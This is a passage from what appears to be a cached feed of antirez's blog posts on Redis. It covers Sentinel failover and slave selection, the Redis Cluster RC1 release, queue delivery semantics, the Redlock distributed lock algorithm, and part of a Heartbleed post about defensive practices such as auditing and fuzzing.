<br>I think this is not a big news for Redis users, this is how Redis replication works: slaves will always try to be the exact copy of their masters. However let’s consider alternative models.
<br>
<br>For example Redis instances could have a Node ID which is persisted in the RDB / AOF file. Every time the node restarts, it loads its Node ID. If the Node ID is wrong, slaves wont replicate from the master at all. Much safer right? Only marginally, actually. The master could have a different misconfiguration, so after a restart, it could reload a data set which is weeks old since snapshotting failed for some reason.
<br>So after a bad restart, we still have the right Node ID, but the dataset is so old to be basically, the same as being wiped more or less, just more subtle do detect.
<br>
<br>However at the cost of making things only marginally more secure we now have a system that may be more complex to operate, and slaves that are in danger of not replicating from the master since the ID does not match, because of operational errors similar to disabling persistence, except, a lot less obvious than that.
<br>
<br>So, let’s change topic, and see a failure mode where Sentinel is *actually* involved, and that can be improved.
<br>
<br>Not all replicas are the same
<br>===
<br>
<br>Technically Redis Sentinel offers a very limited set of simple to understand guarantees.
<br>
<br>1) All the Sentinels will agree about the configuration as soon as they can communicate. Actually each sub-partition will always agree.
<br>2) Sentinels can’t start a failover without an authorization from the majority of Sentinel processes.
<br>3) Failovers are strictly ordered: if a failover happened later in time, it has a greater configuration “number” (config epoch in Sentinel slang), that will always win over older configurations.
<br>4) Eventually the Redis instances are configured to map with the winning logical configuration (the one with the greater config epoch).
<br>
<br>This means that the dataset semantics is “last failover wins”. However the missing information here is, during a failover, what slave is picked to replace the master? This is, all in all, a fundamental property. For example if Redis Sentinel fails by picking a wiped slave (that just restarted with a wrong configuration), *that* is a problem with Sentinel. Sentinel should make sure that, even within the limits of the fact that Redis is an asynchronously replicated system, it will try to make the best interest of the user by picking the best slave around, and refusing to failover at all if there is no viable slave reachable.
<br>
<br>This is a place where improvements are possible, and this is what happens today to select a slave when the master is failing:
<br>
<br>1) If a slaves was restarted, and never was connected with the master after the restart, performing a successful synchronization (data transfer), it is skipped.
<br>2) If the slave is disconnected from its master for more than 10 times the configured timeout (the time a master should be not reachable for the set of Sentinels to detect a master as failing), it is considered to be non elegible.
<br>3) Out of the remaining slaves, Sentinel picks the one with the best “replication offset”.
<br>
<br>The replication offset is a number that Redis master-slave replication uses to take a count of the amount of bytes sent via the replication channel. it is useful in many ways, not just for failovers. For example in partial resynchronizations after a net split, slaves will ask the master, give me data starting from offset X, which is the last byte I received, and so forth.
<br>
<br>However this replication number has two issues when used in the context of picking the best slave to promote.
<br>
<br>1) It is reset after restarts. This sounds harmless at first, since we want to pick slaves with the higher number, and anyway, after a restart if a slave can’t connect, it is skipped. However it is not harmless at all, read more.
<br>2) It is just a number: it does not imply that a Redis slave replicated from *a given* master.
<br>
<br>Also note that when a slave is promoted to master, it inherits the master’s replication offset. So modulo restarts, the number keeps increasing.
<br>
<br>Why “1” and/or “2” are suboptimal choices and can be improved?
<br>
<br>Imagine this setup. We have nodes A B C D E.
<br>D is the current master, and is partitioned away with E in a minority partition. E still replicates from D, everything is fine from their POV.
<br>
<br>However in the majority partition, A B C can exchange messages, and A is elected master.
<br>Later A restarts, resetting its offset. B and C replicate from it, starting again with lower offsets.
<br>After some time A fails, and, at the same time, E rejoins the majority partition.
<br>
<br>E has a data set that is less updated compared to the B and C data set, however its replication offset is higher. Not just that, actually E can claim it was recently connected to its master.
<br>
<br>To improve upon this is easy. Each Redis instance has a “runid”, an unique ID that changes for each new Redis run. This is useful in partial resynchronizations in order to avoid getting an incremental stream from a wrong master. Slaves should publish what is the last master run id they replicated successful from, and Sentinel failover should make sure to only pick slaves that replicated from the master they are actually failing over.
<br>
<br>Once you tight the replication offset to a given runid, what you get is an *absolute* meter of how much updated a slave is. If two slaves are available, and both can claim continuity with the old master, the one with the higher replication offset is guaranteed to be the best pick.
<br>
<br>However this also creates availability concerns in all the cases where data is not very important but availability is. For example if when A crashes, only E becomes available, even if it used to replicate from D, it is still better than nothing. I would say that when you need an highly available cache and consistency is not a big issue, to use a Redis cluster ala-memcached (client side consistent hashing among N masters) is the way to go.
<br>
<br>Note that even without checking the runid, to make the replication offsets durable after a restart, already improves the behavior considerably. In the above example E would be picked only if when isolated in a minority partition with the slave, received more writes than the other slaves in the majority side.
<br>
<br>TLDR: we have to fix this. It is not related to restarting masters without a dataset, but is useful to have a more correct implementation. However this will limit only a class of very-hard-to-trigger issues.
<br>
<br>This is in my TODO list for some time now, and congrats to Aphyr for identifying a real implementation issue in a matter of a few tweets exchanged. About the failure reported by Aphyr from the unknown company, I don’t think it is currently viable to try to protect against serious misconfigurations, however it is a clear sign that we need better Sentinel docs which are more incremental compared to the ones we have now, that try to describe how the system works. A wiser approach could be to start with a common sane configuration, and “don’t do” list like, don’t turn persistence off, unless you are ok with wiped instances.
<a href=\"http://antirez.com/news/80\">Comments</a>" nil "http://antirez.com/news/80" "f70928f1822d3da61502a0b66d31a81d") (32 (26588 31766 989468 685000) "http://antirez.com/news/79
" "Redis cluster, no longer vaporware. " nil "Thu, 09 Oct 2014 14:35:23 +0000" "The first commit I can find in my git history about Redis Cluster is dated March 29 2011, but it is a “copy and commit” merge: the history of the cluster branch was destroyed since it was a total mess of work-in-progress commits, just to shape the initial idea of API and interactions with the rest of the system.
<br>
<br>Basically it is a roughly 4 years old project. This is about two thirds the whole history of the Redis project. Yet, it is only today, that I’m releasing a Release Candidate, the first one, of Redis 3.0.0, which is the first version with Cluster support.
<br>
<br>An erratic run
<br>—
<br>
<br>To understand why it took so long is straightforward: I started the cluster project with a lot of rush, in a moment where it looked like Redis was going to be totally useless without an automatic way to scale.
<br>It was not the right moment to start the Cluster project, simply because Redis itself was too immature, so we didn't yet have a solid “single instance” story to tell.
<br>
<br>While I did the error of starting a project with the wrong timing, at least I didn’t fell in the trap of ignoring the requests arriving from the community, so the project was stopped and stopped an infinite number of times in order to provide more bandwidth to other fundamental features. Persistence, replication, latency, introspection, received a lot more care than cluster, simply because they were more important for the user base.
<br>
<br>Another limit of the project was that, when I started it, I had no clue whatsoever about distributed programming. I did a first design that was horrible, and managed to capture well only what were the “products” requirement: low latency, linear scalability and small overhead for small clusters. However all the details were wrong, and it was far more complex than it had to be, the algorithms used were unsafe, and so forth.
<br>
<br>While I was doing small progresses I started to study the basics of distributed programming, redesigned Redis Cluster, and applied the same ideas to the new version of Sentinel. The distributed programming algorithms used by both systems are still primitive since they are asynchronous replicated, eventually consistent systems, so I had no need to deal with consensus and other non trivial problems. However even when you are addressing a simple problem, compared to writing a CP store at least, you need to understand what you are doing otherwise the resulting system can be totally wrong.
<br>
<br>Despite all this problems, I continued to work at the project, trying to fix it, fix the implementation, and bring it to maturity, because there was this simple fact, like an elephant into a small room, permeating all the Redis Community, which is: people were doing again and again, with their efforts, and many times in a totally broken way, two things:
<br>
<br>1) Sharding the dataset among N nodes.
<br>2) A responsive failover procedure in order to survive certain failures.
<br>
<br>Problem “2” was so bad that at some point I decided to start the Redis Sentinel project before Cluster was finished in order to provide an HA system ASAP, and one that was more suitable than Redis Cluster for the majority of use cases that required just “2” and not “1”.
<br>
<br>Finally I’m starting to see the first real-world result of this efforts, and now we have a release candidate that is the fundamental milestone required to get adoption, fix the remaining bugs, and improve the system in a more incremental way.
<br>
<br>What it actually does?
<br>—
<br>
<br>Redis Cluster is basically a data sharding strategy, with the ability to reshard keys from one node to another while the cluster is running, together with a failover procedure that makes sure the system is able to survive certain kinds of failures.
<br>
<br>From the point of view of distributed databases, Redis Cluster provides a limited amount of availability during partitions, and a weak form of consistency. Basically it is neither a CP nor an AP system. In other words, Redis Cluster does not achieve the theoretical limits of what is possible with distributed systems, in order to gain certain real world properties.
<br>
<br>The consistency model is the famous “eventual consistency” model. Basically if nodes get desynchronized because of partitions, it is guaranteed that when the partition heals, all the nodes serving a given key will agree about its value.
<br>
<br>However the merge strategy is “last failover wins”, so writes received during network partitions can be lost. A common example is what happens if a master is partitioned into a minority partition with clients trying to write to it. If when the partition heals, in the majority side of the partition a slave was promoted to replace this master, the writes received by the old master are lost.
<br>
<br>This in turn means that Redis Cluster does not have to take meta data in the data structures in order to attempt a value merge, and that the fancy commands and data structures supported by Redis are also supported by Redis Cluster. So no additional memory overhead, no API limits, no limits in the amount of elements a value can contain, but less safety during partitions.
<br>
<br>It is trivial to understand that in a system designed like Redis Cluster is, nodes diverging are not good, so the system tries to mitigate its shortcomings by trying to limit the probability of two nodes diverging (and the amount of divergence). This is achieved in a few ways:
<br>
<br>1) The minority side of a partition becomes not available.
<br>2) The replication is designed so that usually the reply to the client, and the replication stream to slaves, is sent at the same time.
<br>3) When multiple slaves are available to failover a master, the system will try to pick the one that appears to be less diverging from the failed master.
<br>
<br>This strategies don’t change the theoretical properties of the system, but add some more real-world protection for the common Redis Clusters failure modes.
<br>
<br>For the Redis API and use case, I believe this design makes sense, but in the past many disagreed. However my opinion is that each designer is free to design a system as she or he wishes, there is just one rule: say the truth, so Redis Cluster documents its limits and failure modes clearly in the official documentation.
<br>
<br>It’s the user, and the use case at hand, that will make a system useful or not. My feeling is that after six years users continued to use Redis even without any clustering support at all, because the use case made this possible, and Redis offers certain specific features and performances that made it very suitable to address certain problems. My hope is that Redis Cluster will improve the life of many of those users.
<br>
<br>The road ahead
<br>—
<br>
<br>Finally we have a minimum viable product to ship, which is stable enough for users to seriously start testing and in certain cases adopt it already. The more adoption, the more we improve it. I know this from Redis and Sentinel: now there is the incremental process that moves a software forward from usable to mature. Listening to users, fixing bugs, covering more code in tests, …
<br>
<br>At the same time, I’m starting to think at the next version of Redis Cluster, improving v1 with many useful things that was not possible to add right now, like multi data center support, more write safety in the minority partition using commands replay, automatic nodes balancing (now there is to reshard manually if certain nodes are too empty and other too full), and many more things.
<br>
<br>Moreover, I believe Redis Cluster could benefit from a special execution mode specifically designed for caching, where nodes accept writes to hash slots they are not in charge for, in order to stay available in a minority partition.
<br>
<br>There is always time to improve and fix our implementation and designs, but focusing too much on how we would like some software to be, has the risk of putting it in the vaporware category for far longer than needed. It’s time to let it go. Enjoy Redis Cluster!
<br>
<br>Redis Cluster RC1 is available both as '3.0.0-rc1' tag at Github, or as a tarball in the Redis.io download page at http://redis.io/download
<a href=\"http://antirez.com/news/79\">Comments</a>" nil "http://antirez.com/news/79" "cd1b69ef0871d1c2a92dc5d520f045a3") (31 (26588 31766 988999 936000) "http://antirez.com/news/78
" "Queues and databases " nil "Mon, 14 Jul 2014 09:53:34 +0000" "Queues are an incredibly useful tool in modern computing, they are often used in order to perform some possibly slow computation at a latter time in web applications. Basically queues allow to split a computation in two times, the time the computation is scheduled, and the time the computation is executed. A “producer”, will put a task to be executed into a queue, and a “consumer” or “worker” will get tasks from the queue to execute them. For example once a new user completes the registration process in a web application, the web application will add a new task to the queue in order to send an email with the activation link. The actual process of sending an email, that may require retrying if there are transient network failures or other errors, is up to the worker.
<br>
<br>Technically speaking we can think at queues as a form of inter-process messaging primitive, where the receiving process needs to acknowledge the reception of the message. Messages can not be fire-and-forget, since the queue needs to understand if the message can be removed from the queue, so some form of acknowledgement is strictly required.
<br>
<br>When receiving a message triggers the execution of a task, like it happens in the kind of queues we are talking about, the moment the message reception is acknowledged changes the semantic of the queue. When the worker process acknowledges the reception of the message *before* processing the message, if the worker fails the message can be lost before the task is performed at all. If the acknowledge is sent only *after* the message gets processed, if the worker fails or because of network partitions the queue may re-deliver the message again. This happens whatever the queue consistency properties are, so, even if the queue is modeled using a system providing strong consistency, the indetermination still holds true:
<br>
<br>* If messages are acknowledged before processing, the queue will have an at-most-once delivery property. This means messages can be processed zero or one time.
<br>* If messages are acknowledged after processing, the queue will have an at-least-once delivery property. This means messages can be processed from 1 to infinite number of times.
<br>
<br>While both of this cases are not perfect, in the real world the second behavior is often preferred, since it is usually much simpler to cope with the case of multiple delivery of the message (triggering multiple executions of the task) than a system that from time to time does not execute a given task at all. An example of at-least-once delivery system is Amazon SQS (Simple Queue Service).
<br>
<br>There is also a fundamental reason why at-least-once delivery systems are to be preferred, that has to do with distributed systems: the other semantics (at-most-once delivery) requires the queue to be strongly consistent: once the message is acknowledged no other worker must be able to acknowledge the same message, which is a strong property.
<br>
<br>Once we move our focus to at-least-once delivery systems, we may notice that to model the queue with a CP system is a waste, and also a disadvantage:
<br>
<br>* Anyway, we can’t guarantee more than at-least-once delivery.
<br>* Our queue lose the ability to work into a minority side of a network partition.
<br>* Because of the consistency requirements the queue needs agreement, so we are burning performances and adding latency without any good reason.
<br>
<br>Since messages may be delivered multiple times, what we want conceptually is a commutative data structure and an eventually consistent system. Messages can be stored into a set data structure replicated into N nodes, with the merge function being the union among the sets. Acknowledges, received by workers after execution of messages, are also conceptually elements of the set, marking a given element as processed. This is a trivial example which is not particularly practical for a real world system, but shows how a given kind of queue is well modeled by a given set of properties of a distributed system.
<br>
<br>Practically speaking there are other useful things our queue may try to provide:
<br>
<br>* Guaranteed delivery to a single worker at least for a window of time: while multiple delivery is allowed, we want to avoid it as much as possible.
<br>* Best-effort checks to avoid to re-delivery a message after a timeout if the message was already processed. Again, we can’t guarantee this property, but we may try hard to reduce re-issuing a message which was actually already processed.
<br>* Enough internal state to handle, during normal operations, messages as a FIFO, so that messages arriving first are processed first.
<br>* Auto cleanup of the internal data structures.
<br>
<br>On top of this we need to retain messages during network partitions, so that conceptually (even if practically we could use different data structures) the set of messages to deliver are the union of all the messages of all the nodes.
<br>
<br>Unfortunately while many Redis based queues implementations exist, no one try to use N Redis independent nodes and the offered primitives as a building block for a distributed system with such characteristics. Using Redis data structures and performances, and algorithms providing certain useful guarantees, may provide a queue system which is very practical to use, easy to administer and scale, while providing excellent performances (messages / second) per node.
<br>
<br>Because I find the topic is interesting and this is an excellent use case for Redis, I’m very slowly working at a design for such a Redis based queue system. I hope to show something during the next weeks, time permitting.
<a href=\"http://antirez.com/news/78\">Comments</a>" nil "http://antirez.com/news/78" "0ec9345a15b9e3beb2b31679f2d137cb") (30 (26588 31766 988661 178000) "http://antirez.com/news/77
" "A proposal for more reliable locks using Redis " nil "Fri, 16 May 2014 11:15:32 +0000" "-----------------
<br>UPDATE: The algorithm is now described in the Redis documentation here => http://redis.io/topics/distlock. The article is left here in its older version, the updates will go into the Redis documentation instead.
<br>-----------------
<br>
<br>Many people use Redis to implement distributed locks. Many believe that this is a great use case, and that Redis worked great to solve an otherwise hard to solve problem. Others believe that this is totally broken, unsafe, and wrong use case for Redis.
<br>
<br>Both are right, basically. Distributed locks are not trivial if we want them to be safe, and at the same time we demand high availability, so that Redis nodes can go down and still clients are able to acquire and release locks. At the same time a fast lock manager can solve tons of problems which are otherwise hard to solve in practice, and sometimes even a far from perfect solution is better than a very slow solution.
<br>
<br>Can we have a fast and reliable system at the same time based on Redis? This blog post is an exploration in this area. I’ll try to describe a proposal for a simple algorithm to use N Redis instances for distributed and reliable locks, in the hope that the community may help me analyze and comment the algorithm to see if this is a valid candidate.
<br>
<br># What we really want?
<br>
<br>Talking about a distributed system without stating the safety and liveness properties we want is mostly useless, because only when those two requirements are specified it is possible to check if a design is correct, and for people to analyze and find bugs in the design. We are going to model our design with just three properties, that are what I believe the minimum guarantees you need to use distributed locks in an effective way.
<br>
<br>1) Safety property: Mutual exclusion. At any given moment, only one client can hold a lock.
<br>
<br>2) Liveness property A: Deadlocks free. Eventually it is always possible to acquire a lock, even if the client that locked a resource crashed or gets partitioned.
<br>
<br>3) Liveness property B: Fault tolerance. As long as the majority of Redis nodes are up, clients are able to acquire and release locks.
<br>
<br># Distributed locks, the naive way.
<br>
<br>To understand what we want to improve, let’s analyze the current state of affairs.
<br>
<br>The simple way to use Redis to lock a resource is to create a key into an instance. The key is usually created with a limited time to live, using Redis expires feature, so that eventually it gets released one way or the other (property 2 in our list). When the client needs to release the resource, it deletes the key.
<br>
<br>Superficially this works well, but there is a problem: this is a single point of failure in our architecture. What happens if the Redis master goes down?
<br>Well, let’s add a slave! And use it if the master is unavailable. This is unfortunately not viable. By doing so we can’t implement our safety property of the mutual exclusion, because Redis replication is asynchronous.
<br>
<br>This is an obvious race condition with this model:
<br>
<br>1) Client A acquires the lock into the master.
<br>
<br>2) The master crashes before the write to the key is transmitted to the slave.
<br>
<br>3) The slave gets promoted to master.
<br>
<br>4) Client B acquires the lock to the same resource A already holds a lock for. <- SAFETY VIOLATION!
<br>
<br>Sometimes it is perfectly fine that under special circumstances, like during a failure, multiple clients can hold the lock at the same time.
<br>If this is the case, stop reading and enjoy your replication based solution. Otherwise keep reading for a hopefully safer way to implement it.
<br>
<br># First, let’s do it correctly with one instance.
<br>
<br>Before to try to overcome the limitation of the single instance setup described above, let’s check how to do it correctly in this simple case, since this is actually a viable solution in applications where a race condition from time to time is acceptable, and because locking into a single instance is the foundation we’ll use for the distributed algorithm described here.
<br>
<br>To acquire the lock, the way to go is the following:
<br>
<br>SET resource_name my_random_value NX PX 30000
<br>
<br>The command will set the key only if it does not already exist (NX option), with an expire of 30000 milliseconds (PX option).
<br>The key is set to a value “my_random_value”. This value requires to be unique across all the clients and all the locks requests.
<br>
<br>Basically the random value is used in order to release the lock in a safe way, with a script that tells Redis: remove the key only if exists and the value stored at the key is exactly the one I expect to be. This is accomplished by the following Lua script:
<br>
<br>if redis.call(\"get\",KEYS[1]) == ARGV[1] then
<br>    return redis.call(\"del\",KEYS[1])
<br>else
<br>    return 0
<br>end
<br>
<br>This is important in order to avoid removing a lock that was created by another client. For example a client may acquire the lock, get blocked into some operation for longer than the lock validity time (the time at which the key will expire), and later remove the lock, that was already acquired by some other client.
<br>Using just DEL is not safe as a client may remove the lock of another client. With the above script instead every lock is “signed” with a random string, so the lock will be removed only if it is still the one that was set by the client trying to remove it.
<br>
<br>What this random string should be? I assume it’s 20 bytes from /dev/urandom, but you can find cheaper ways to make it unique enough for your tasks.
<br>For example a safe pick is to seed RC4 with /dev/urandom, and generate a pseudo random stream from that.
<br>A simpler solution is to use a combination of unix time with microseconds resolution, concatenating it with a client ID, it is not as safe, but probably up to the task in most environments.
<br>
<br>The time we use as the key time to live, is called the “lock validity time”. It is both the auto release time, and the time the client has in order to perform the operation required before another client may be able to acquire the lock again, without technically violating the mutual exclusion guarantee, which is only limited to a given window of time from the moment the lock is acquired.
<br>
<br>So now we have a good way to acquire and release the lock. The system, reasoning about a non-distrubited system which is composed of a single instance, always available, is safe. Let’s extend the concept to a distributed system where we don’t have such guarantees.
<br>
<br># Distributed version
<br>
<br>In the distributed version of the algorithm we assume to have N Redis masters. Those nodes are totally independent, so we don’t use replication or any other implicit coordination system. We already described how to acquire and release the lock safely in a single instance. We give for granted that the algorithm will use this method to acquire and release the lock in a single instance. In our examples we set N=5, which is a reasonable value, so we need to run 5 Redis masters in different computers or virtual machines in order to ensure that they’ll fail in a mostly independent way.
<br>
<br>In order to acquire the lock, the client performs the following operations:
<br>
<br>Step 1) It gets the current time in milliseconds.
<br>
<br>Step 2) It tries to acquire the lock in all the N instances sequentially, using the same key name and random value in all the instances.
<br>
<br>During the step 2, when setting the lock in each instance, the client uses a timeout which is small compared to the total lock auto-release time in order to acquire it.
<br>For example if the auto-release time is 10 seconds, the timeout could be in the ~ 5-50 milliseconds range.
<br>This prevents the client to remain blocked for a long time trying to talk with a Redis node which is down: if an instance is not available, we should try to talk with the next instance ASAP.
<br>
<br>Step 3) The client computes how much time elapsed in order to acquire the lock, by subtracting to the current time the timestamp obtained in step 1.
<br>If and only if the client was able to acquire the lock in the majority of the instances (at least 3), and the total time elapsed to acquire the lock is less than lock validity time, the lock is considered to be acquired.
<br>
<br>Step 4) If the lock was acquired, its validity time is considered to be the initial validity time minus the time elapsed, as computed in step 3.
<br>
<br>Step 5) If the client failed to acquire the lock for some reason (either it was not able to lock N/2+1 instances or the validity time is negative), it will try to unlock all the instances (even the instances it believe it was not able to lock).
<br>
<br># Synchronous or not?
<br>
<br>Basically the algorithm is partially synchronous: it relies on the assumption that while there is no synchronized clock across the processes, still the local time in every process flows approximately at the same rate, with an error which is small compared to the auto-release time of the lock. This assumption closely resembles a real-world computer: every computer has a local clock and we can usually rely on different computers to have a clock drift which is small.
<br>
<br>Moreover we need to refine our mutual exclusion rule: it is guaranteed only as long as the client holding the lock will terminate its work within the lock validity time (as obtained in step 3), minus some time (just a few milliseconds in order to compensate for clock drift between processes).
<br>
<br># Retry
<br>
<br>When a client is not able to acquire the lock, it should try again after a random delay in order to try to desynchronize multiple clients trying to acquire the lock, for the same resource, at the same time (this may result in a split brain condition where nobody wins). Also the faster a client will try to acquire the lock in the majority of Redis instances, the less window for a split brain condition (and the need for a retry), so ideally the client should try to send the SET commands to the N instances at the same time using multiplexing.
<br>
<br>It is worth to stress how important is for the clients that failed to acquire the majority of locks, to release the (partially) acquired locks ASAP, so that there is no need to wait for keys expiry in order for the lock to be acquired again (however if a network partition happens and the client is no longer able to communicate with the Redis instances, there is to pay an availability penalty and wait for the expires).
<br>
<br># Releasing the lock
<br>
<br>Releasing the lock is simple and involves just to release the lock in all the instances, regardless of the fact the client believe it was able to successfully lock a given instance.
<br>
<br># Safety arguments
<br>
<br>Is this system safe? We can try to understand what happens in different scenarios.
<br>
<br>To start let’s assume that a client is able to acquire the lock in the majority of instances. All the instances will contain a key with the same time to live. However the key was set at different times, so the keys will also expire at different times. However if the first key was set at worst at time T1 (the time we sample before contacting the first server) and the last key was set at worst at time T2 (the time we obtained the reply from the last server), we are sure that the first key to expire in the set will exist for at least MIN_VALIDITY=TTL-(T2-T1)-CLOCK_DRIFT. All the other keys will expire later, so we are sure that the keys will be simultaneously set for at least this time.
<br>
<br>During the time the majority of keys are set, another client will not be able to acquire the lock, since N/2+1 SET NX operations can’t succeed if N/2+1 keys already exist. So if a lock was acquired, it is not possible to re-acquire it at the same time (violating the mutual exclusion property).
<br>
<br>However we want to also make sure that multiple clients trying to acquire the lock at the same time can’t simultaneously succeed.
<br>
<br>If a client locked the majority of instances using a time near, or greater, than the lock maximum validity time (the TTL we use for SET basically), it will consider the lock invalid and will unlock the instances, so we only need to consider the case where a client was able to lock the majority of instances in a time which is less than the validity time. In this case for the argument already expressed above, for MIN_VALIDITY no client should be able to re-acquire the lock. So multiple clients will be albe to lock N/2+1 instances at the same time (with “time\" being the end of Step 2) only when the time to lock the majority was greater than the TTL time, making the lock invalid.
<br>
<br>Are you able to provide a formal proof of safety, or to find a bug? That would be very appreciated.
<br>
<br># Liveness arguments
<br>
<br>The system liveness is based on three main features:
<br>
<br>1) The auto release of the lock (since keys expire): eventually keys are available again to be locked.
<br>
<br>2) The fact that clients, usually, will cooperate removing the locks when the lock was not acquired, or when the lock was acquired and the work terminated, making it likely that we don’t have to wait for keys to expire to re-acquire the lock.
<br>
<br>3) The fact that when a client needs to retry a lock, it waits a time which is comparable greater to the time needed to acquire the majority of locks, in order to probabilistically make split brain conditions during resource contention unlikely.
<br>
<br>However there is at least a scenario where a very special network partition/rejoin pattern, repeated indefinitely, may violate the system availability.
<br>For example with N=5, two clients A and B may try to lock the same resource at the same time, nobody will be able to acquire the majority of locks, but they may be able to lock the majority of nodes if we sum the locks of A and B (for example client A locked 2 instances, client B just one instance).
<br>Then the clients are partitioned away before they can unlock the locked instances. This will leave the resource not lockable for a time roughly equal to the auto release time. Then when the keys expire, the two clients A and B join again the partition repeating the same pattern, and so forth indefinitely.
<br>
<br>Another point of view to see the problem above, is that we pay an availability penalty equal to “TTL” time on network partitions, so if there are continuous partitions, we can pay this penalty indefinitely.
<br>
<br>I can’t find a simple way to have guaranteed liveness (but did not tried very hard honestly), but the worst case appears to be hard to trigger.
<br>Basically it means that we can only provide, using this algorithm, an approximation of Property number 2.
<br>
<br># Performance, crash-recovery and fsync
<br>
<br>Many users using Redis as a lock server need high performance in terms of both latency to acquire and release a lock, and number of acquire / release operations that it is possible to perform per second. In order to meet this requirement, the strategy to talk with the N Redis servers to reduce latency is definitely multiplexing (or poor’s man multiplexing, which is, putting the socket in non-blocking mode, send all the commands, and read all the commands later, assuming that the RTT between the client and each instance is similar).
<br>
<br>However there is another consideration to do about persistence if we want to target a crash-recovery system model.
<br>
<br>Basically to see the problem here, let’s assume we configure Redis without persistence at all. A client acquires the lock in 3 of 5 instances. One of the instances where the client was able to acquire the lock is restarted, at this point there are again 3 instances that we can lock for the same resource, and another client can lock it again, violating the safety property of exclusivity of lock.
<br>
<br>If we enable AOF persistence, things will improve quite a bit. For example we can upgrade a server by sending SHUTDOWN and restarting it. Because Redis expires are semantically implemented so that virtually the time still elapses when the server is off, all our requirements are fine.
<br>However everything is fine as long as it is a clean shutdown. What about a power outage? If Redis is configured, as by default, to fsync on disk every second, it is possible that after a restart our key is missing. Long story short if we want to guarantee the lock safety in the face of any kind of instance restart, we need to enable fsync=always in the persistence setting. This in turn will totally ruin performances to the same level of CP systems that are traditionally used to implement distributed locks in a safe way.
<br>
<br>The good news is that because in our algorithm we don’t stop to acquire locks as soon as we reach the majority of the servers, the actual probability of safety violation is small, because most of the times the lock will be hold in all the 5 servers, so even if one restarts without a key, it is practically unlikely (but not impossible) that an actual safety violation happens. Long story short, this is an user pick, and a big trade off. Given the small probability for a race condition, if it is acceptable that with an extremely small probability, after a crash-recovery event, the lock may be acquired at the same time by multiple clients, the fsync at every operation can (and should) be avoided.
<br>
<br># Reference implementation
<br>
<br>I wrote a simple reference implementation in Ruby, backed by redis-rb, here: http://github.com/antirez/redlock-rb
<br>
<br># Want to help?
<br>
<br>If you are into distributed systems, it would be great to have your opinion / analysis.
<br>Also reference implementations in other languages could be great.
<br>
<br>Thanks in advance!
<br>
<br>EDIT: I received feedbacks in this blog post comment and via Hacker News that's worth to incorporate in this blog post.
<br>
<br>1) As Steven Benjamin notes in the comments below, if after restarting an instance we can make it unavailable for enough time for all the locks that used this instance to expire, we don't need fsync. Actually we don't need any persistence at all, so our safety guarantee can be provided with a pure in-memory configuration.
<br>
<br>An example: previously we described the example race condition where a lock is obtained in 3 servers out of 5, and one of the servers where the lock was obtained restarts empty: another client may acquire the same lock by locking this server and the other two that were not locked by the previous client. However if the restarted server is not available for queries enough time for all the locks that were obtained with it to expire, we are guaranteed this race is no longer possible.
<br>
<br>2) The Hacker News user eurleif noticed how it is possible to reacquire the lock as a strategy if the client notices it is taking too much time in order to complete the operation. This can be done by just extending an existing lock, sending a script that extends the expire of the value stored at the key is the expected one. If there are no new partitions, and we try to extend the lock enough in advance so that the keys will not expire, there is the guarantee that the lock will be extended.
<br>
<br>3) The Hacker News user mjb noted how the term \"skew\" is not correct to describe the difference of the rate at which different clocks increment their local time, and I'm actually talking about \"Drift\". I'm replacing the word \"skew\" with \"drift\" to use the correct term.
<br>
<br>Thanks for the very useful feedbacks.
<a href=\"http://antirez.com/news/77\">Comments</a>" nil "http://antirez.com/news/77" "b878828d9a62607423c9fe8276b48a8b") (29 (26588 31766 987760 631000) "http://antirez.com/news/76
" "Using Heartbleed as a starting point " nil "Thu, 10 Apr 2014 09:06:18 +0000" "The strong reactions about the recent OpenSSL bug are understandable: it is not fun when suddenly all the internet needs to be patched. Moreover for me personally how trivial the bug is, is disturbing. I don’t want to point the finger to the OpenSSL developers, but you just usually think at those class of issues as a bit more subtle, in the case of a software like OpenSSL. Usually you fail to do sanity checks *correctly*, as opposed to this bug where there is a total *lack* of bound checks in the memcpy() call.
<br>
<br>However sometimes in the morning I read the code I wrote the night before and I’m deeply embarrassed. Programmers sometimes fail, I for sure do often, so my guess is that what is needed is a different process, and not a different OpenSSL team.
<br>
<br>There is who proposes a different language safer than C, and who proposes that the specification is broken because it is too complex. Probably there is some truth in both arguments, however it is unlikely that we move to a different specification or system language soon, so the real question is, what we can do now to improve system software security?
<br>
<br>1) Throw money at it.
<br>
<br>Making system code safer is simple if there are investments. If different companies hire security experts to do code auditings in the OpenSSL code base, what happens is that the probability of discovering a bug like heartbleed is greater.
<br>
<br>I’ve seen very complex bugs that are triggered by a set of non-trivial conditions being discovered by serious code auditing efforts. A memcpy() without bound checks is something that if you analyze the code security-wise, will stand out in the first read. And guess how heartbleed was discovered? Via security auditings performed at Google.
<br>
<br>Probably the time to consider open source something that mostly we take from is over. Many companies should follow the example of Google and other companies, using workforce for OSS software development and security.
<br>
<br>2) Static and dynamic checks.
<br>
<br>Static code analysis is, as a side effect, a semi-automated way to do code auditings.
<br>In critical system code like OpenSSL even to do some source code annotation or use a set of rules to make static analysis more effective is definitely acceptable.
<br>
<br>Static tools today are not a total solution, but the output of a static analysis if carefully inspected by an expert programmer can provide some value.
<br>
<br>Another great help comes from dynamic checks like Valgrind. Every system software written in C should be tested using Valgrind automatically at every new commit.
<br>
<br>3) Abstract C with libraries.
<br>
<br>C is low level and has no built in safety in the language. However something good about C is that it is a language that allows to build layers on top of its rawness.
<br>
<br>A sane dynamic string library prevents a lot of buffer overflow issues, and today almost every decent project is using one. However there is more you can do about it. For example for security critical code where memory can contain things like private keys, you can augment your dynamic string library with memory copy primitives that only copy from one buffer to the other performing implicit sanity checks.
<br>
<br>Moreover if a buffer contains critical data, you can set logical permissions so that trying to copy from this area aborts the program. There are other less-portable ways using memory management to protect important memory pages in an even more effective ways, however an higher C-level protection can be much simpler in the real-world because of portability / predictability concerns.
<br>
<br>In general many things can be explored to avoid using C without protections, creating a library that abstracts on top of it to make programming safer.
<br>
<br>4) Randomized tests.
<br>
<br>Unit tests are unlikely to trigger edge cases and failed sanity checks.
<br>There is a class of tests that is known since decades that is, in my opinion, not used enough: fuzzy testing.
<br>
<br>The OpenSSL bug was definitely discoverable by sending different kind of OpenSSL packets with different randomized parameters, in conjunction with dynamic analysis tools like Valgrind.
<br>
<br>In my experience having a great deal of randomized tests together with an environment where the same tests are ran again and again with the program running over Valgrind, can discover a number of real-world bugs that gets otherwise unnoticed. There are many models to explore, usually you want something that injects totally random data, and intermediate models where valid packets are corrupted in different random ways.
<br>
<br>A typical example of this technique is the old DNS compression infinite-loop bug. Trow a few random packets to a naive implementation and you’ll find it in a matter of minutes.
<br>
<br>5) Change of mentality about security vs performance.
<br>
